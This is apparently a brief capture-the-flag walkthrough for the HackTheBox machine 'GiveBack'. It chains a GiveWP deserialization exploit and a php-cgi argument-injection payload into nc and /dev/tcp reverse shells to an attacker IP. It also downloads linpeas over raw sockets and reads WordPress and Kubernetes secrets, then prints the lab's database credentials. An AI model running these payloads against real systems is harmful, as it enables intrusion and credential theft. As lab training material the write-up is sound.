# GiveBack: HackTheBox Machine

Just check this [writeup](https://dudenation.github.io/posts/giveback-htb-season9/)

---

hostname: giveback.htb

There is a portal link which is potentially vulnerable to insecure deserialization

After a lot of digging, I found that this site uses the GiveWP plugin which has a CVE registered to it in the year 2025.

Link: https://github.com/RandomRobbieBF/CVE-2025-22777
https://cve.imfht.com/detail/CVE-2025-22777

This works:
python CVE-2024-5932-rce.py --url "http://giveback.htb/donations/the-things-we-need/" -c "bash -c 'bash -i >& /dev/tcp/10.10.14.92/4444 0>&1'

Now i used this repo: https://github.com/EQSTLab/CVE-2024-5932


There was a metasploit module for this but I am unsure of why it didn't work

mariadb-password: sW5sp4spa3u7RLyetrekE4oS
mariadb-root-password: sW5sp4syetre32828383kE4oS
wordpress-password: O8F7KR5zGi


Some more stuff:

define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


Using these credentials on running this command and seeing wp_users, you can log in to mysql
mysql -u root -psW5sp4syetre32828383kE4oS -h beta-vino-wp-mariadb -P 3306

+------------+------------------------------------+--------------+
| user_login | user_pass                          | display_name |
+------------+------------------------------------+--------------+
| user       | $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | babywyrm     |
+------------+------------------------------------+--------------+

Use this command after hosting a server to download linpeas.sh onto the system

exec 3<>/dev/tcp/10.10.14.92/8000; printf "GET /linpeas.sh HTTP/1.0\r\nHost: 10.10.14.92\r\nConnection: close\r\n\r\n" >&3; cat <&3 > linpeas.sh

https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et
Use this

Now there is a legacy intranet serice on port 5000 vulnerable to php-cgi rce.

Soooo,

php -r '
$nuii="rm /tmp/nuii;mkfifo /tmp/nuii;cat /tmp/nuii|sh -i 2>&1|nc IP 2222 > /tmp/nuii";
$o = array("http"=>array("method"=>"POST", "header"=>"Content-Type: application/x-www-form-urlencoded","content"=>$nuii,"timeout"=>4));
$c=stream_context_create($o);
$r=@file_get_contents("http://legacy-intranet-service:5000/cgi-bin/php-cgi?--define+allow_url_include%3don+--define+auto_prepend_file%3dphp://input", false,$c);
echo $r==false?"":substr($r,0,5000);'

This will get you a shell, be sure to replace the IP with your ip.


curl -k \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets


Use this command to get the password. Token can be found at /var/run/secrets/kubernetes.io/serviceaccount/token

Password is:
OSlWaWX445Xa6rY0UVUfb6Q83vTtZac


Use this to log in to the babywyrm account

"data": {
        "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
        "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
      },

---
